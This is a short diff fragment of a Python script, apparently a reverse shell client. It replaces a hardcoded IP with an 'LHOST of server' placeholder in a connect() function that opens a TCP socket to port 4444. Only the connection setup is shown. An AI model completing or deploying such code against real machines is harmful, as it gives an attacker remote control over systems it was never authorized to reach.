@@ -3,7 +3,7 @@ import subprocess
 import os
 
 def connect():
-	host = '192.168.0.11'
+	host = 'LHOST of server'
 	port = 4444
 
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
